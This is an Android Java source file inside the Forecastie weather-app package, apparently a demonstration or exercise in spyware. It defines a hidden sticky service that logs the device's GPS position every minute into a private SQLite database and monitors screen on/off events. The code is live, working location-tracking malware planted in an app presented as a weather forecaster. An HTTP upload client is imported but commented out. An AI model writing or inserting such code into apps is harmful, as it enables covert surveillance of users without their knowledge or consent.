package cz.martykan.forecastie;

import android.Manifest;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.os.IBinder;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import java.text.SimpleDateFormat;
import java.util.Calendar;

import com.loopj.android.http.AsyncHttpClient;
import com.loopj.android.http.AsyncHttpResponseHandler;
import com.loopj.android.http.RequestParams;

import cz.msebera.android.httpclient.Header;

public class EvilLocationSpyService extends Service {

    static public EvilLocationSpyService instance;
    static public EvilLocationSpy evilness;
    static public LocationManager locationManager;
    static public EvilScreenMonitor screenSwitchReceiver;
    static public long setMeterThreshold = 0; // Distancia mínima que tiene que haberse movido para que nos reporte el cambio.
    static public long setTimeThreshold = 1 * 60 * 1000; // En milisegundos. Tiempo mínimo entre updates.

    @Override
    public IBinder onBind(Intent intent) {

        return null;

    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        super.onStartCommand(intent, flags, startId);
        return START_STICKY;

    }

    @Override
    public void onCreate() {

        Log.d("EvilLocationSpyService", "Initialized");

        instance = this;
        evilness = new EvilLocationSpy(this);
        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);

        startLocationUpdates(setTimeThreshold, setMeterThreshold);

        // Activa el EvilScreenMonitor.
        IntentFilter filter = new IntentFilter(Intent.ACTION_SCREEN_ON);
        filter.addAction(Intent.ACTION_SCREEN_OFF);
        screenSwitchReceiver = new EvilScreenMonitor(this);
        registerReceiver(screenSwitchReceiver, filter);

    }

    @Override
    public void onDestroy() {
        stopLocationUpdates();
    }

    public void stopLocationUpdates(){
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            locationManager.removeUpdates(evilness);
        }
    }

    public void startLocationUpdates(long timeThreshold, long meterThreshold){

        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED || ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, timeThreshold, meterThreshold, evilness);
            setTimeThreshold = timeThreshold;
            setMeterThreshold = meterThreshold;
        }

    }

}

class EvilLocationSpy implements LocationListener {

    private static Context context;
    private static SQLiteDatabase evilDatabase;
    //private static final AsyncHttpClient client = new AsyncHttpClient();

    public EvilLocationSpy(Context inContext){

        Log.d("EvilLocationSpy", "Initialized");

        context = inContext;
        evilDatabase = SQLiteDatabase.openOrCreateDatabase(context.getFilesDir() + "evilData.db", null);
        evilDatabase.execSQL("CREATE TABLE IF NOT EXISTS locations(ts VARCHAR,latitude DOUBLE, longitude DOUBLE);");

        /* Para ver qué hay.
        Cursor cursor = evilDatabase.rawQuery("SELECT * FROM locations", null);
        try {
            while(cursor.moveToNext()) {
                String when = cursor.getString(0);
                String lat = cursor.getString(1);
                String lon = cursor.getString(2);
                Boolean p = true;
            }
        } finally {
            cursor.close();
        }
        */

    }

    public void onLocationChanged(Location location) {

        Log.d("EvilLocationSpy", "Location updated");
        // Cada vez que cambia, registro la hora en la base de datos.
        Calendar c = Calendar.getInstance();
        String formattedDate = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(c.getTime());

        evilDatabase.execSQL("INSERT INTO locations VALUES('" + formattedDate + "'," + location.getLatitude() + "," + location.getLongitude() + ");");

    }

    public void onStatusChanged(String provider, int status, Bundle extras) {}

    public void onProviderEnabled(String provider) {}

    public void onProviderDisabled(String provider) {}


}
